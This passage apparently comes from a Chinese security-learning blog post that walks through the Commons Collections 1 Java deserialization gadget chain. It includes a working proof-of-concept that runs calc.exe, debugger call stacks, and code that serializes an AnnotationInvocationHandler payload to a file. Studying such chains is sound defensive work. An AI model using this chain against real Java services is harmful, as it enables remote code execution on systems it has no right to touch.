<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">commons_collections1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">onlyElement</span> <span class="operator">=</span> (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行该POC后成功弹出计算器，表示该POC在当前环境下可利用</p>
<p>两种调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:76, ConstantTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">checkSetValue:169, TransformedMap (org.apache.commons.collections.map)</span><br><span class="line">setValue:191, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)</span><br><span class="line">main:35, commons_collections1 (ysoserial)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:119, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">checkSetValue:169, TransformedMap (org.apache.commons.collections.map)</span><br><span class="line">setValue:191, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)</span><br><span class="line">main:35, commons_collections1 (ysoserial)</span><br></pre></td></tr></table></figure>

<p>根据调用栈分析：</p>
<p><strong>onlyElement.setValue(“foobar”);</strong></p>
<p>经过上面调试，onlyElement是<code>AbstracInputCheckedMapDecorator$MapEntry</code>对象，进入其setValue函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中this.parent是<code>TransformedMap</code>对象，进入TransformedMap的checkSetValue方法</p>
<p><strong>checkSetValue</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时的this.valueTransformer是<code>ChainedTransformer</code>对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230510163731.png"></p>
<p><strong>ChainedTransformer中transform方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>循环iTransformers中的对象调用其transform方法，最终返回object对象</p>
<p><strong>注：</strong>在ChainedTransformer中transform方法中起到对象拼接的作用</p>
<p><strong>F7步入循环的第一步</strong></p>
<p>来到了ConstantTransformer对象的transform方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230510165138.png"></p>
<p>此时的this.iConstant是class.java.lang.Runtime类，执行完后object也是class.java.lang.Runtime类</p>
<p><strong>F7步入循环第二步</strong></p>
<p>来到了InvokerTransformer对象的transform方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取input对象的class</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="comment">// 根据参数获取class的Method方法对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="comment">// 调用这个方法</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230510170032.png"></p>
<p>此时object是Method对象：<code>public static java.lang.Runtime java.lang.Runtime.getRuntime()</code></p>
<p><strong>F7步入循环第三步</strong></p>
<p>再次来到来到了InvokerTransformer对象的transform方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230510170529.png"></p>
<p>此时object是Runtime对象</p>
<p><strong>F7步入循环第四步</strong></p>
<p>再次来到来到了InvokerTransformer对象的transform方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230510171009.png"></p>
<p>执行完此时object是Runtime对象，并且弹出计算器，命令执行成功</p>
<h2 id="回看POC构造"><a href="#回看POC构造" class="headerlink" title="回看POC构造"></a>回看POC构造</h2><p>目的：执行<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code></p>
<p>通用反射机制语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br><span class="line">.getMethod(<span class="string">&quot;exec&quot;</span>, String.class)</span><br><span class="line">.invoke(</span><br><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))</span><br><span class="line">,</span><br><span class="line"><span class="string">&quot;calc.exe&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>在此之前观察InvokerTransformer类的构造函数和transform的关键代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取input对象的class</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="comment">// 根据参数获取class的Method方法对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="comment">// 调用这个方法</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>反射机制中的第一个invoke</strong></p>
<p>根据InvokerTransformer中的代码可以得到其构造函数的参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))</span><br><span class="line">this.iMethodNam = &quot;exec&quot;</span><br><span class="line">this.iParamTypes = String.class</span><br><span class="line">this.iArgs = &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure>

<p>由此得到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>目前将焦点转移至<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))</code></p>
<p><strong>第二步</strong></p>
<p>由于input没有办法输入，因此需要借组ChainedTransformer进行拼接</p>
<p>要点：关于input.getClass()方法</p>
<blockquote>
<ul>
<li>当input是一个类的实例对象时，获取到的是这个类</li>
<li>当input是一个类时，获取到的是java.lang.Class</li>
</ul>
</blockquote>
<p>最终目标：<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))</code></p>
<p>它等价于对象<code>Runtime.getRuntime()</code>，其通过getClass方法得到class java.lang.Runtime</p>
<p>于是得到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="comment">//以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例</span></span><br><span class="line">    <span class="comment">// new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))),</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>但是Runtime类的定义没有继承<code>Serializable</code>类，所以是不支持反序列化的，就需要想办法在服务端生成Runtime对象</p>
<p><strong>第三步</strong></p>
<p>Runtime对象是通过<code>Runtime.getRuntime()</code>得到的，<code>InvokerTransformer</code>里面的反射机制可以执行任意函数，查看getRuntime()函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而如果需要得到getRuntime()方法对象，则需要input为Runtime实例，回到我们需要解决的问题之上</p>
<p>由于在transform中的getClass方法中不能得到class Runtime，只能得到java.lang.Class</p>
<p>可以借助其getMethod类，由于getMethod类存在于Class类中</p>
<p><strong>重新梳理：</strong></p>
<p>目的：获取Runtime实例，即<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)</code></p>
<p>先获取getRuntime方法对象，即目标：<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;)</code></p>
<p>由于没有办法获取到java.lang.Runtime，故更改为java.lang.Class开头，转换成如下语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//目标语句</span><br><span class="line">Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;)</span><br><span class="line">//使用java.lang.Class开头</span><br><span class="line">Class.forName(&quot;java.lang.Class&quot;).getMethod(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;)</span><br><span class="line">        .invoke(Class.forName(&quot;java.lang.Runtime&quot;),&quot;getRuntime&quot;,new Class[0]);</span><br></pre></td></tr></table></figure>

<p>根据InvokerTransformer中的代码可以得到其构造函数的参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input = java.lang.Class</span><br><span class="line">this.iMethodNam = &quot;getMethod&quot;</span><br><span class="line">this.iParamTypes = new Class[] &#123;String.class, Class[].class &#125;</span><br><span class="line">this.iArgs = new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;</span><br></pre></td></tr></table></figure>

<p>由此得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;)</span><br></pre></td></tr></table></figure>

<p>得到了getRuntime方法对象对象后，需要执行其方法，下一个input输入是上一个input输出，即getRuntime对象实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input java.lang.Runtime.getRuntime() </span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"><span class="comment">// cls = java.lang.reflect.Method</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line"><span class="comment">// 现在getMethod的方法名为invoke，其参数也是根据invoke方法而定的</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br></pre></td></tr></table></figure>

<p><code>invoke方法.invoke(input, this.iArgs)</code>实际上等于<code>input.invoke(this.iArgs)</code></p>
<p>现在的input是getRuntime对象实例，故只需要填写this.iArgs即可</p>
<p>getRuntime是个静态函数，不需要参数，传入null即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;)</span><br></pre></td></tr></table></figure>

<p>整合起来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>参考中有一张很好的图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230510204224.png"></p>
<p><strong>为什么要使用TransformedMap</strong></p>
<p>上面构造了ChainedTransformer对象，如果现在需要利用，则客户端将ChainedTransformer对象序列化输出至文件，服务端使用读取文件，使用readObject将文件中的内容反序列化成ChainedTransformer对象，为了能够触发命令执行，还需要这个对象调用transform，显然以上情况在服务端是不可能存在的，故需要借助在服务端的一种普遍操作来达到目的</p>
<p>现在有的是ChainedTransformer对象，即一个转换链，<strong>TransformedMap</strong>类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload</p>
<p>这样命令执行的触发条件从调用transform函数转变成修改map中的值</p>
<p>TransformedMap中的静态方法decorate</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就有了POC的以下部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"><span class="comment">//给予map数据转化链</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br></pre></td></tr></table></figure>

<p><strong>AnnotationInvocationHandler的readObject</strong></p>
<p>现在的POC得到的是一个Map对象，客户端将Map对象序列化后输入到文件中，服务端需要从文件中读取内容借助readObject反序列化成Map对象，然后对其值进行修改操作，这样才有可能命令执行，达到目的。现在需要找到一个类，在反序列化readObject逻辑中有写入操作从而触发命令执行</p>
<p>AnnotationInvocationHandler的构造函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新增的POC代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, outerMap);</span><br></pre></td></tr></table></figure>

<p>执行完AnnotationInvocationHandler的构造函数后</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230511110612.png"></p>
<p>此时的instance是AnnotationInvocationHandler对象，里面的类变量的值如上图所示</p>
<p>构造好AnnotationInvocationHandler对象后，对其进行序列化发给服务端，服务端接收后对其进行readObject方法，如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line"><span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fi);</span><br><span class="line"><span class="comment">//服务端反序列化</span></span><br><span class="line">fin.readObject();</span><br></pre></td></tr></table></figure>

<p>找到AnnotationInvocationHandler的readObject处下断点，执行到<code>fin.readObject();</code>步入，调用栈为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readObject:427, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:606, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1017, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1893, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1798, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1350, ObjectInputStream (java.io)</span><br><span class="line">readObject:370, ObjectInputStream (java.io)</span><br><span class="line">main:62, commons_collections1 (ysoserial)</span><br></pre></td></tr></table></figure>

<p>查看AnnotationInvocationHandler的readObject函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 默认反序列化</span></span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="comment">// 获取构造的map迭代器</span></span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        <span class="comment">// 遍历map迭代器</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span 